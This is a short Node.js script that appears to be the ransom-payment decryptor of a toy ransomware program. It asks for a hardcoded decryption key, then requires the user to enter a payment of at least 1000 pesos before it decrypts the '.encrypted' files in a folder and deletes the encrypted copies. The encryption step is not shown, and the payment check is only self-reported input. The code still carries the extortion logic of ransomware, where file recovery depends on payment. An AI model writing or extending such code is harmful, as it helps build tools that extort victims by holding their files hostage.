var encryptor = require('file-encryptor');
var fs = require('fs');
var path = require('path');
var readlineSync = require('readline-sync');

var key = '';
var superkey = 'sheessh';

while (superkey !== key) {
  key = readlineSync.question('Enter decryption key: ');

  if (superkey !== key) {
    console.error('Incorrect key. Please try again.');
  }
}

// Ask user for payment amount
var paymentAmount = parseFloat(readlineSync.question('Enter payment amount in pesos: '));

// Check if the payment amount is at least 1000 pesos
if (paymentAmount >= 1000) {
  var inputFolder = './folder/';
  var outputFolder = './folder/';

  // Function to decrypt a file and remove the encrypted file afterward.
  function decryptAndRemoveFile(encryptedFile, outputFile, key) {
    encryptor.decryptFile(encryptedFile, outputFile, key, function(err) {
      if (err) {
        console.error('Decryption error:', err);
      } else {
        // Decryption complete, now remove the encrypted file.
        fs.unlink(encryptedFile, function(err) {
          if (err) {
            console.error('Error removing encrypted file:', err);
          } else {
            console.log('Decryption and file removal successful.');
          }
        });
      }
    });
  }

  // Read all files in the input folder
  fs.readdir(inputFolder, function(err, files) {
    if (err) {
      console.error('Error reading folder:', err);
      return;
    }

    // Decrypt each encrypted text file in the folder
    files.forEach(function(file) {
      if (path.extname(file) === '.encrypted') {
        var encryptedFile = path.join(inputFolder, file);
        var outputFile = path.join(outputFolder, path.basename(file, '.encrypted'));

        decryptAndRemoveFile(encryptedFile, outputFile, key);
      }
    });
  });
} else {
  console.log('Payment amount is below 1000 pesos. Decryption not allowed.');
}
